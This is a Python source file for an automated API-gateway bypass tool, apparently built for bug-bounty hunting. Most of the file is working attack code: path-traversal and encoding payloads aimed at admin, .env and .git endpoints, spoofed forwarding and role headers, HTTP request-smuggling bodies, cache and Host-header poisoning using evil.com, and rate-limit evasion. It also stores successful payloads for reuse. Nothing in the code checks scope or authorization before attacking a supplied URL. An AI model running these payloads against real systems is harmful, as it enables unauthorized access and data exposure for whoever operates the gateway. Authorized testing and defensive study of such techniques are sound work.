"""
API Gateway Bypass Tester Agent

Advanced API gateway security testing including path normalization attacks, header
injection, HTTP method override, direct backend access, routing manipulation, and
authentication bypass techniques specifically targeting gateway layers.

Real-world examples:
- DoorDash (2026-02-07): SYSTEMIC gateway bypass via Apollo Gateway - all 29 mutations
  reached gRPC backends without authentication (CRITICAL, est. $75K-$200K)

Average bounty: $8K-$25K per gateway bypass vulnerability
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import time
import json
import requests
import hashlib
from typing import Dict, List, Optional, Any, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse, urljoin, quote, unquote
from collections import defaultdict
from datetime import datetime, date


# Database integration
try:
    from engine.core.database import BountyHoundDB
    from engine.core.db_hooks import DatabaseHooks
    DB_AVAILABLE = True
except ImportError:
    DB_AVAILABLE = False


class GatewaySeverity(Enum):
    """Severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class BypassTechnique(Enum):
    """Gateway bypass techniques"""
    PATH_NORMALIZATION = "path_normalization"
    HEADER_INJECTION = "header_injection"
    METHOD_OVERRIDE = "method_override"
    PROTOCOL_CONFUSION = "protocol_confusion"
    CACHE_POISONING = "cache_poisoning"
    RATE_LIMIT_BYPASS = "rate_limit_bypass"
    DIRECT_BACKEND = "direct_backend"
    HOST_HEADER_ATTACK = "host_header_attack"


@dataclass
class GatewayBypassVulnerability:
    """Gateway bypass vulnerability"""
    vuln_id: str
    severity: GatewaySeverity
    technique: BypassTechnique
    title: str
    description: str
    endpoint: str
    evidence: Dict[str, Any]
    remediation: str
    cwe: str = ""
    cvss_score: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for database storage."""
        return {
            'vuln_id': self.vuln_id,
            'severity': self.severity.value,
            'technique': self.technique.value,
            'title': self.title,
            'description': self.description,
            'endpoint': self.endpoint,
            'evidence': self.evidence,
            'remediation': self.remediation,
            'cwe': self.cwe,
            'cvss_score': self.cvss_score
        }


class APIGatewayBypassTester:
    """
    Advanced API gateway bypass testing agent

    Tests for:
    - Path normalization bypass
    - Header manipulation
    - Method override
    - Direct backend access
    - Authentication bypass
    - Rate limiting circumvention

    Database-first workflow:
    - Checks recent testing history
    - Reuses successful payloads
    - Prevents duplicate findings
    """

    def __init__(self, gateway_url: str, backend_url: Optional[str] = None,
                 headers: Optional[Dict[str, str]] = None, target_domain: Optional[str] = None):
        """
        Initialize API Gateway Bypass Tester.

        Args:
            gateway_url: API gateway URL (e.g., https://api.example.com)
            backend_url: Optional backend service URL for direct access testing
            headers: Optional custom HTTP headers
            target_domain: Domain for database tracking (defaults to gateway hostname)
        """
        self.gateway_url = gateway_url.rstrip('/')
        self.backend_url = backend_url
        self.target_domain = target_domain or urlparse(gateway_url).netloc
        self.vulnerabilities: List[GatewayBypassVulnerability] = []
        self.session = requests.Session()
        self.session.verify = False

        # Set default headers
        default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        if headers:
            default_headers.update(headers)
        self.session.headers.update(default_headers)

        # Database integration
        self.db = BountyHoundDB() if DB_AVAILABLE else None
        self.tested_endpoints: Set[str] = set()

    def run_comprehensive_test(self) -> Dict[str, Any]:
        """
        Execute full gateway bypass testing with database integration.

        Returns:
            Results dictionary with vulnerabilities and metadata
        """
        start_time = datetime.now()

        results = {
            "gateway": self.gateway_url,
            "target_domain": self.target_domain,
            "timestamp": time.time(),
            "tests_run": [],
            "vulnerabilities": [],
            "database_context": None
        }

        print(f"[*] Starting API Gateway Bypass Testing: {self.gateway_url}")

        # Database-first: Check testing history
        if self.db:
            print("\n[*] Checking database for previous tests...")
            db_context = DatabaseHooks.before_test(self.target_domain, 'api_gateway_bypass_tester')
            results["database_context"] = db_context

            if db_context.get('should_skip'):
                print(f"⚠️  {db_context['reason']}")
                print(f"Previous findings: {len(db_context.get('previous_findings', []))}")
                print("Recommendations:")
                for rec in db_context.get('recommendations', []):
                    print(f"  - {rec}")

                # Still allow testing but inform user
                user_choice = input("\nContinue anyway? (y/n): ").lower()
                if user_choice != 'y':
                    return results
            else:
                print(f"✓ {db_context['reason']}")
                for rec in db_context.get('recommendations', []):
                    print(f"  - {rec}")

        # Phase 1: Path Normalization Attacks
        print("\n[*] Phase 1: Path Normalization Bypass")
        path_vulns = self.test_path_normalization()
        results["tests_run"].append("path_normalization")
        self.vulnerabilities.extend(path_vulns)

        # Phase 2: Header Injection
        print("\n[*] Phase 2: Header Injection Attacks")
        header_vulns = self.test_header_injection()
        results["tests_run"].append("header_injection")
        self.vulnerabilities.extend(header_vulns)

        # Phase 3: Method Override
        print("\n[*] Phase 3: HTTP Method Override")
        method_vulns = self.test_method_override()
        results["tests_run"].append("method_override")
        self.vulnerabilities.extend(method_vulns)

        # Phase 4: Protocol Confusion
        print("\n[*] Phase 4: Protocol Confusion Attacks")
        protocol_vulns = self.test_protocol_confusion()
        results["tests_run"].append("protocol_confusion")
        self.vulnerabilities.extend(protocol_vulns)

        # Phase 5: Cache Poisoning
        print("\n[*] Phase 5: Cache Poisoning")
        cache_vulns = self.test_cache_poisoning()
        results["tests_run"].append("cache_poisoning")
        self.vulnerabilities.extend(cache_vulns)

        # Phase 6: Rate Limiting Bypass
        print("\n[*] Phase 6: Rate Limiting Bypass")
        rate_vulns = self.test_rate_limiting_bypass()
        results["tests_run"].append("rate_limiting")
        self.vulnerabilities.extend(rate_vulns)

        # Phase 7: Direct Backend Access
        print("\n[*] Phase 7: Direct Backend Access")
        backend_vulns = self.test_direct_backend_access()
        results["tests_run"].append("direct_backend")
        self.vulnerabilities.extend(backend_vulns)

        # Phase 8: Host Header Attacks
        print("\n[*] Phase 8: Host Header Manipulation")
        host_vulns = self.test_host_header_attacks()
        results["tests_run"].append("host_header")
        self.vulnerabilities.extend(host_vulns)

        # Compile results
        results["vulnerabilities"] = [
            {
                "id": v.vuln_id,
                "severity": v.severity.value,
                "technique": v.technique.value,
                "title": v.title,
                "cvss": v.cvss_score
            }
            for v in self.vulnerabilities
        ]

        # Record to database
        if self.db:
            duration = (datetime.now() - start_time).total_seconds()
            self.db.record_tool_run(
                domain=self.target_domain,
                tool_name='api_gateway_bypass_tester',
                findings_count=len(self.vulnerabilities),
                duration_seconds=int(duration)
            )

            # Save findings to database
            for vuln in self.vulnerabilities:
                self._save_finding_to_db(vuln)

        return results

    def test_path_normalization(self) -> List[GatewayBypassVulnerability]:
        """Test path normalization bypass attacks"""
        vulnerabilities = []

        # Get successful payloads from database first
        proven_payloads = []
        if self.db:
            proven_payloads = DatabaseHooks.get_successful_payloads(
                vuln_type='PATH_NORMALIZATION',
                limit=5
            )

        # Protected endpoints to test
        protected_paths = [
            "/admin",
            "/internal",
            "/api/admin",
            "/api/internal",
            "/management",
            "/actuator",
            "/.git/config",
            "/.env",
        ]

        # Path normalization payloads
        bypass_payloads = [
            # Path traversal
            ("/../{path}", "dot_dot_slash"),
            ("/..%2f{path}", "encoded_dot_dot_slash"),
            ("/..\\{path}", "backslash_traversal"),
            ("/..%5c{path}", "encoded_backslash"),
            ("/..../{path}", "double_dot"),
            ("/....///{path}", "multiple_slash"),

            # URL encoding
            ("/%2e%2e/{path}", "double_encoded_dot"),
            ("/%252e%252e/{path}", "triple_encoded_dot"),

            # Mixed encoding
            ("/..%252f{path}", "mixed_encoding"),
            ("/.%2e/{path}", "partial_encoding"),

            # Null bytes
            ("/api%00/{path}", "null_byte"),
            ("/api;/{path}", "semicolon"),

            # Unicode
            ("/api%c0%af{path}", "unicode_slash"),
            ("/api%e0%80%af{path}", "overlong_utf8"),

            # Duplicate slashes
            ("/api//{path}", "double_slash"),
            ("/api///{path}", "triple_slash"),

            # Case manipulation
            ("/API/{path}", "uppercase"),
            ("/Api/{path}", "mixed_case"),

            # Special characters
            ("/api/./{path}", "dot_slash"),
            ("/api/.//{path}", "dot_double_slash"),
        ]

        # Try proven payloads first
        if proven_payloads:
            print(f"[+] Testing {len(proven_payloads)} proven payloads first...")
            for proven in proven_payloads:
                bypass_payloads.insert(0, (proven['payload'], f"proven_{proven['context']}"))

        for protected_path in protected_paths:
            # Baseline: Direct access (should be blocked)
            baseline_url = self.gateway_url + protected_path

            try:
                baseline_response = self.session.get(baseline_url, timeout=10, allow_redirects=False)
                baseline_status = baseline_response.status_code

                # If already accessible, not protected
                if baseline_status in [200, 201, 202]:
                    continue

                print(f"[*] Testing bypass for: {protected_path} (baseline: {baseline_status})")

                # Test bypass techniques
                for payload_template, technique in bypass_payloads:
                    payload = payload_template.format(path=protected_path.lstrip('/'))

                    # Remove leading slash duplication
                    if payload.startswith('//'):
                        payload = payload[1:]

                    bypass_url = self.gateway_url + payload

                    try:
                        response = self.session.get(bypass_url, timeout=10, allow_redirects=False)

                        # Success: Bypassed if we get 200 instead of 403/404
                        if response.status_code in [200, 201, 202] and baseline_status in [403, 404, 401]:
                            vuln = GatewayBypassVulnerability(
                                vuln_id=f"GW-PATH-{technique.upper()}",
                                severity=GatewaySeverity.CRITICAL,
                                technique=BypassTechnique.PATH_NORMALIZATION,
                                title=f"Path Normalization Bypass via {technique}",
                                description=f"Gateway authorization can be bypassed using {technique} to access protected endpoint: {protected_path}",
                                endpoint=protected_path,
                                evidence={
                                    "technique": technique,
                                    "payload": payload,
                                    "bypass_url": bypass_url,
                                    "baseline_status": baseline_status,
                                    "bypass_status": response.status_code,
                                    "response_length": len(response.text)
                                },
                                remediation="Normalize paths before authorization checks. Block encoded traversal sequences. Use allow-list routing.",
                                cwe="CWE-22",
                                cvss_score=9.1
                            )
                            vulnerabilities.append(vuln)

                            print(f"[!] BYPASS FOUND: {technique} -> {response.status_code}")

                            # Save successful payload to database
                            if self.db:
                                self._record_successful_payload(
                                    vuln_type='PATH_NORMALIZATION',
                                    payload=payload_template,
                                    context=technique
                                )

                            break

                    except Exception:
                        continue

            except Exception:
                continue

        return vulnerabilities

    def test_header_injection(self) -> List[GatewayBypassVulnerability]:
        """Test header injection for gateway bypass"""
        vulnerabilities = []

        # Test endpoints
        test_endpoints = [
            "/admin",
            "/api/admin/users",
            "/internal",
            "/management",
        ]

        # Header injection payloads
        bypass_headers = [
            # Forwarded headers
            ({"X-Forwarded-For": "127.0.0.1"}, "x_forwarded_for_localhost"),
            ({"X-Forwarded-For": "10.0.0.1"}, "x_forwarded_for_internal"),
            ({"X-Forwarded-Host": "localhost"}, "x_forwarded_host"),
            ({"X-Forwarded-Proto": "https"}, "x_forwarded_proto"),

            # Real IP headers
            ({"X-Real-IP": "127.0.0.1"}, "x_real_ip_localhost"),
            ({"X-Remote-IP": "127.0.0.1"}, "x_remote_ip"),
            ({"X-Originating-IP": "127.0.0.1"}, "x_originating_ip"),
            ({"X-Client-IP": "127.0.0.1"}, "x_client_ip"),

            # Rewrite headers
            ({"X-Original-URL": "/admin"}, "x_original_url"),
            ({"X-Rewrite-URL": "/admin"}, "x_rewrite_url"),
            ({"X-Original-URI": "/admin"}, "x_original_uri"),

            # Custom headers
            ({"X-Gateway-Bypass": "true"}, "x_gateway_bypass"),
            ({"X-Internal-Request": "true"}, "x_internal_request"),
            ({"X-Service-Auth": "internal"}, "x_service_auth"),
            ({"X-Authenticated": "true"}, "x_authenticated"),
            ({"X-User": "admin"}, "x_user_admin"),
            ({"X-Role": "administrator"}, "x_role_admin"),

            # Via headers
            ({"Via": "1.1 localhost"}, "via_localhost"),
        ]

        for endpoint in test_endpoints:
            url = self.gateway_url + endpoint

            # Baseline request
            try:
                baseline = self.session.get(url, timeout=10)
                baseline_status = baseline.status_code

                # Skip if already accessible
                if baseline_status in [200, 201, 202]:
                    continue

                print(f"[*] Testing header injection for: {endpoint} (baseline: {baseline_status})")

                # Test each header bypass
                for headers, technique in bypass_headers:
                    try:
                        response = self.session.get(url, headers=headers, timeout=10)

                        # Success: Bypassed if we get 200 instead of 403/404
                        if response.status_code in [200, 201, 202] and baseline_status in [403, 404, 401]:
                            vuln = GatewayBypassVulnerability(
                                vuln_id=f"GW-HDR-{technique.upper()}",
                                severity=GatewaySeverity.CRITICAL,
                                technique=BypassTechnique.HEADER_INJECTION,
                                title=f"Authorization Bypass via {technique} Header",
                                description=f"Gateway trusts {list(headers.keys())[0]} header, allowing authentication bypass.",
                                endpoint=endpoint,
                                evidence={
                                    "technique": technique,
                                    "headers": headers,
                                    "baseline_status": baseline_status,
                                    "bypass_status": response.status_code,
                                    "response_length": len(response.text)
                                },
                                remediation="Never trust client-provided headers for authorization. Validate all routing headers at gateway.",
                                cwe="CWE-284",
                                cvss_score=9.8
                            )
                            vulnerabilities.append(vuln)

                            print(f"[!] BYPASS FOUND: {technique} -> {response.status_code}")

                            # Check for duplicates before recording
                            if self.db:
                                dup_check = DatabaseHooks.check_duplicate(
                                    target=self.target_domain,
                                    vuln_type='HEADER_INJECTION',
                                    keywords=[technique, endpoint]
                                )
                                if not dup_check['is_duplicate']:
                                    self._record_successful_payload(
                                        vuln_type='HEADER_INJECTION',
                                        payload=json.dumps(headers),
                                        context=technique
                                    )

                            break

                    except Exception:
                        continue

            except Exception:
                continue

        return vulnerabilities

    def test_method_override(self) -> List[GatewayBypassVulnerability]:
        """Test HTTP method override bypass"""
        vulnerabilities = []

        # Test endpoints (typically REST resources)
        test_endpoints = [
            "/api/users/1",
            "/api/admin/config",
            "/api/resources/test",
        ]

        # Method override techniques
        override_methods = [
            # Headers
            ({"X-HTTP-Method-Override": "DELETE"}, "DELETE", "x_http_method_override"),
            ({"X-Method-Override": "PUT"}, "PUT", "x_method_override"),
            ({"X-HTTP-Method": "PATCH"}, "PATCH", "x_http_method"),

            # Query parameters
            ({"_method": "DELETE"}, "DELETE", "query_param_method"),

            # POST body parameter
            ({}, "DELETE", "post_body_method"),
        ]

        for endpoint in test_endpoints:
            url = self.gateway_url + endpoint

            # Baseline: Try DELETE directly (should be forbidden)
            try:
                baseline = self.session.delete(url, timeout=10)
                baseline_status = baseline.status_code

                # If DELETE already allowed, skip
                if baseline_status in [200, 202, 204]:
                    continue

                print(f"[*] Testing method override for: {endpoint} (baseline DELETE: {baseline_status})")

                # Test override techniques
                for override_data, target_method, technique in override_methods:
                    try:
                        # Use POST with override
                        if "_method" in override_data:
                            # Query parameter
                            response = self.session.post(f"{url}?_method={target_method}", timeout=10)
                        elif "post_body" in technique:
                            # POST body
                            response = self.session.post(url, data={"_method": target_method}, timeout=10)
                        else:
                            # Header
                            response = self.session.post(url, headers=override_data, timeout=10)

                        # Success: Override worked if we get 200/204 instead of 403/405
                        if response.status_code in [200, 202, 204] and baseline_status in [403, 405, 401]:
                            vuln = GatewayBypassVulnerability(
                                vuln_id=f"GW-METHOD-{technique.upper()}",
                                severity=GatewaySeverity.HIGH,
                                technique=BypassTechnique.METHOD_OVERRIDE,
                                title=f"Authorization Bypass via HTTP Method Override ({technique})",
                                description=f"Gateway allows method override via {technique}, bypassing method-based access controls.",
                                endpoint=endpoint,
                                evidence={
                                    "technique": technique,
                                    "original_method": "POST",
                                    "overridden_to": target_method,
                                    "override_data": override_data,
                                    "baseline_status": baseline_status,
                                    "bypass_status": response.status_code
                                },
                                remediation="Disable HTTP method override in production. Implement authorization checks per method.",
                                cwe="CWE-436",
                                cvss_score=8.1
                            )
                            vulnerabilities.append(vuln)

                            print(f"[!] METHOD OVERRIDE BYPASS: {technique} -> {response.status_code}")
                            break

                    except Exception:
                        continue

            except Exception:
                continue

        return vulnerabilities

    def test_protocol_confusion(self) -> List[GatewayBypassVulnerability]:
        """Test protocol confusion attacks"""
        vulnerabilities = []

        # Test HTTP/1.1 vs HTTP/2 differences
        test_url = self.gateway_url + "/api/test"

        # HTTP request smuggling patterns
        smuggling_payloads = [
            # CL.TE (Content-Length vs Transfer-Encoding)
            {
                "headers": {
                    "Content-Length": "4",
                    "Transfer-Encoding": "chunked"
                },
                "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
                "technique": "cl_te_smuggling"
            },

            # TE.CL
            {
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Content-Length": "6"
                },
                "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
                "technique": "te_cl_smuggling"
            },
        ]

        for payload in smuggling_payloads:
            try:
                response = self.session.post(
                    test_url,
                    headers=payload["headers"],
                    data=payload["body"],
                    timeout=10
                )

                # Check if smuggling succeeded (complex to detect, simplified here)
                if "admin" in response.text.lower() or response.status_code == 200:
                    vuln = GatewayBypassVulnerability(
                        vuln_id=f"GW-PROTO-{payload['technique'].upper()}",
                        severity=GatewaySeverity.CRITICAL,
                        technique=BypassTechnique.PROTOCOL_CONFUSION,
                        title=f"HTTP Request Smuggling: {payload['technique']}",
                        description="Gateway vulnerable to HTTP request smuggling, allowing backend access bypass.",
                        endpoint=test_url,
                        evidence={
                            "technique": payload["technique"],
                            "headers": payload["headers"],
                            "response_status": response.status_code
                        },
                        remediation="Use HTTP/2 only. Reject requests with both Content-Length and Transfer-Encoding.",
                        cwe="CWE-444",
                        cvss_score=9.8
                    )
                    vulnerabilities.append(vuln)

                    print(f"[!] HTTP SMUGGLING DETECTED: {payload['technique']}")

            except Exception:
                continue

        return vulnerabilities

    def test_cache_poisoning(self) -> List[GatewayBypassVulnerability]:
        """Test cache poisoning attacks"""
        vulnerabilities = []

        test_endpoints = ["/", "/api/public"]

        # Cache poisoning headers
        poison_headers = [
            ({"X-Forwarded-Host": "evil.com"}, "x_forwarded_host"),
            ({"X-Original-URL": "/admin"}, "x_original_url"),
            ({"X-Rewrite-URL": "/internal"}, "x_rewrite_url"),
        ]

        for endpoint in test_endpoints:
            url = self.gateway_url + endpoint

            for headers, technique in poison_headers:
                try:
                    # First request with poisoned header
                    response1 = self.session.get(url, headers=headers, timeout=10)

                    # Second request without header (to check if cached)
                    time.sleep(1)
                    response2 = self.session.get(url, timeout=10)

                    # If poison persists in second response, cache was poisoned
                    poison_value = list(headers.values())[0]

                    if poison_value in response2.text or poison_value in str(response2.headers):
                        vuln = GatewayBypassVulnerability(
                            vuln_id=f"GW-CACHE-{technique.upper()}",
                            severity=GatewaySeverity.HIGH,
                            technique=BypassTechnique.CACHE_POISONING,
                            title=f"Cache Poisoning via {technique}",
                            description=f"Gateway cache can be poisoned via {list(headers.keys())[0]} header.",
                            endpoint=endpoint,
                            evidence={
                                "technique": technique,
                                "poison_header": headers,
                                "poison_value": poison_value,
                                "persisted_in_cache": True
                            },
                            remediation="Exclude unkeyed headers from cache key. Validate all headers before caching.",
                            cwe="CWE-444",
                            cvss_score=7.5
                        )
                        vulnerabilities.append(vuln)

                        print(f"[!] CACHE POISONING: {technique}")
                        break

                except Exception:
                    continue

        return vulnerabilities

    def test_rate_limiting_bypass(self) -> List[GatewayBypassVulnerability]:
        """Test rate limiting bypass techniques"""
        vulnerabilities = []

        test_url = self.gateway_url + "/api/test"

        # Trigger rate limit
        print("[*] Triggering rate limit...")
        rate_limited = False

        for i in range(100):
            try:
                response = self.session.get(test_url, timeout=5)

                if response.status_code == 429:
                    rate_limited = True
                    print(f"[+] Rate limit triggered after {i+1} requests")
                    break

            except Exception:
                continue

        if not rate_limited:
            print("[-] No rate limit detected")
            return vulnerabilities

        # Test bypass techniques
        bypass_techniques = [
            ({"X-Forwarded-For": "1.2.3.4"}, "x_forwarded_for"),
            ({"X-Real-IP": "5.6.7.8"}, "x_real_ip"),
            ({"X-Originating-IP": "9.10.11.12"}, "x_originating_ip"),
            ({"X-Client-IP": "13.14.15.16"}, "x_client_ip"),
            ({"X-Remote-Addr": "17.18.19.20"}, "x_remote_addr"),
        ]

        for headers, technique in bypass_techniques:
            try:
                response = self.session.get(test_url, headers=headers, timeout=10)

                # If bypass worked, we get 200 instead of 429
                if response.status_code != 429:
                    vuln = GatewayBypassVulnerability(
                        vuln_id=f"GW-RATE-{technique.upper()}",
                        severity=GatewaySeverity.MEDIUM,
                        technique=BypassTechnique.RATE_LIMIT_BYPASS,
                        title=f"Rate Limiting Bypass via {technique}",
                        description=f"Rate limiting can be bypassed by spoofing {list(headers.keys())[0]} header.",
                        endpoint=test_url,
                        evidence={
                            "technique": technique,
                            "bypass_headers": headers,
                            "rate_limit_bypassed": True,
                            "status_after_bypass": response.status_code
                        },
                        remediation="Don't trust client-provided IP headers for rate limiting. Use actual connection IP.",
                        cwe="CWE-770",
                        cvss_score=6.5
                    )
                    vulnerabilities.append(vuln)

                    print(f"[!] RATE LIMIT BYPASS: {technique}")
                    break

            except Exception:
                continue

        return vulnerabilities

    def test_direct_backend_access(self) -> List[GatewayBypassVulnerability]:
        """Test direct backend access"""
        vulnerabilities = []

        if not self.backend_url:
            print("[-] No backend URL provided, skipping direct access test")
            return vulnerabilities

        # Try accessing backend directly
        test_endpoints = ["/api/test", "/api/admin", "/health"]

        for endpoint in test_endpoints:
            backend_test_url = self.backend_url.rstrip('/') + endpoint

            try:
                response = self.session.get(backend_test_url, timeout=10)

                if response.status_code < 500:
                    vuln = GatewayBypassVulnerability(
                        vuln_id="GW-DIRECT-BACKEND",
                        severity=GatewaySeverity.HIGH,
                        technique=BypassTechnique.DIRECT_BACKEND,
                        title="Backend Service Directly Accessible",
                        description=f"Backend service is accessible directly, bypassing gateway authentication and rate limiting.",
                        endpoint=endpoint,
                        evidence={
                            "backend_url": backend_test_url,
                            "status_code": response.status_code,
                            "gateway_bypassed": True
                        },
                        remediation="Restrict backend services to only accept connections from gateway IP. Use network segmentation.",
                        cwe="CWE-284",
                        cvss_score=8.1
                    )
                    vulnerabilities.append(vuln)

                    print(f"[!] DIRECT BACKEND ACCESS: {endpoint} -> {response.status_code}")
                    break

            except Exception:
                continue

        return vulnerabilities

    def test_host_header_attacks(self) -> List[GatewayBypassVulnerability]:
        """Test Host header manipulation"""
        vulnerabilities = []

        test_url = self.gateway_url + "/api/test"

        # Host header payloads
        host_payloads = [
            "evil.com",
            "localhost",
            "127.0.0.1",
            "internal.service",
            f"{urlparse(self.gateway_url).netloc}@evil.com",
        ]

        for host_value in host_payloads:
            try:
                response = self.session.get(
                    test_url,
                    headers={"Host": host_value},
                    timeout=10,
                    allow_redirects=False
                )

                # Check if host value reflected
                if host_value in response.text or host_value in str(response.headers):
                    vuln = GatewayBypassVulnerability(
                        vuln_id="GW-HOST-POISON",
                        severity=GatewaySeverity.MEDIUM,
                        technique=BypassTechnique.HOST_HEADER_ATTACK,
                        title="Host Header Injection Vulnerability",
                        description="Gateway reflects Host header value, potentially allowing cache poisoning and password reset poisoning.",
                        endpoint=test_url,
                        evidence={
                            "host_value": host_value,
                            "reflected": True
                        },
                        remediation="Validate Host header. Use allow-list of valid domains.",
                        cwe="CWE-644",
                        cvss_score=6.5
                    )
                    vulnerabilities.append(vuln)

                    print(f"[!] HOST HEADER INJECTION: {host_value}")
                    break

            except Exception:
                continue

        return vulnerabilities

    def generate_report(self, output_file: str):
        """Generate comprehensive gateway bypass report"""
        report = {
            "gateway": self.gateway_url,
            "target_domain": self.target_domain,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "vulnerabilities": {
                "critical": len([v for v in self.vulnerabilities if v.severity == GatewaySeverity.CRITICAL]),
                "high": len([v for v in self.vulnerabilities if v.severity == GatewaySeverity.HIGH]),
                "medium": len([v for v in self.vulnerabilities if v.severity == GatewaySeverity.MEDIUM]),
                "low": len([v for v in self.vulnerabilities if v.severity == GatewaySeverity.LOW]),
            },
            "findings": [v.to_dict() for v in sorted(self.vulnerabilities, key=lambda x: x.cvss_score, reverse=True)]
        }

        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n[+] Report saved to: {output_file}")
        return report

    def _save_finding_to_db(self, vuln: GatewayBypassVulnerability):
        """Save vulnerability finding to database"""
        if not self.db:
            return

        try:
            # Check for duplicates first
            dup_check = DatabaseHooks.check_duplicate(
                target=self.target_domain,
                vuln_type=vuln.technique.value,
                keywords=[vuln.endpoint, vuln.title]
            )

            if dup_check['is_duplicate']:
                print(f"[!] Duplicate finding skipped: {vuln.title}")
                return

            # Record finding
            self.db.record_finding(
                domain=self.target_domain,
                title=vuln.title,
                severity=vuln.severity.value,
                vuln_type=vuln.technique.value,
                description=vuln.description,
                poc=json.dumps(vuln.evidence),
                endpoints=json.dumps([vuln.endpoint])
            )

        except Exception as e:
            print(f"[!] Failed to save finding to database: {e}")

    def _record_successful_payload(self, vuln_type: str, payload: str, context: str):
        """Record successful payload to database for reuse"""
        if not self.db:
            return

        try:
            self.db.record_successful_payload(
                vuln_type=vuln_type,
                payload=payload,
                context=context,
                tech_stack=None,  # Could be enhanced to detect tech stack
                notes=f"Successful against {self.target_domain}"
            )
        except Exception as e:
            print(f"[!] Failed to record payload: {e}")


# Example usage
if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python api_gateway_bypass_tester.py <gateway_url> [backend_url]")
        sys.exit(1)

    gateway = sys.argv[1]
    backend = sys.argv[2] if len(sys.argv) > 2 else None

    tester = APIGatewayBypassTester(
        gateway_url=gateway,
        backend_url=backend
    )

    results = tester.run_comprehensive_test()
    tester.generate_report("gateway-bypass-report.json")

    print(f"\n{'='*60}")
    print(f"API Gateway Bypass Testing Complete")
    print(f"{'='*60}")
    print(f"Vulnerabilities Found: {len(results['vulnerabilities'])}")
    for severity in ['critical', 'high', 'medium', 'low']:
        count = len([v for v in tester.vulnerabilities if v.severity.value == severity])
        if count > 0:
            print(f"  {severity.upper()}: {count}")
